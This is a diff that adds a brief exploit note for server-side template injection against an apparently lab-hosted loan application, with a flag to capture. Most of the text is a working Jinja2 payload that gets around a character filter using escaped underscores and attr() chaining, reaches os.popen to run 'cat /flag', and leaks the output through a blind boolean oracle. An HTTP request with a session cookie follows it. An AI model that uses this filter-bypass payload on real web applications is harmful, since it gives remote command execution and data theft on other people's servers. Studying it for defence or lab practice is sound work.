@@ -1,0 +1,5 @@
+# SSTI via Jinja2 filter bypass. Filter blocks {{, }}, ., _, [  but {%...%} blocks with \x5f escapes and |attr() chaining bypass all restrictions. Full RCE via lipsum.__globals__['os'].popen(). Extracts /flag via blind boolean oracle. PAYLOAD: principal={% set r=lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("get")("os")|attr("popen")("cat /flag")|attr("read")() %}{% for c in r|list %}{% if (loop|attr("index0")) == 0 %}{% if c > "e" %}1{% else %}0{% endif %}{% endif %}{% endfor %}
+
+GET /total_loan_payments HTTP/1.1
+Host: 172.17.0.1:49653
+Cookie: session=eyJ1c2VyX2lkIjoxfQ.adzM8g.ijwRZABdcXblpSn84gUZTD14MbQ
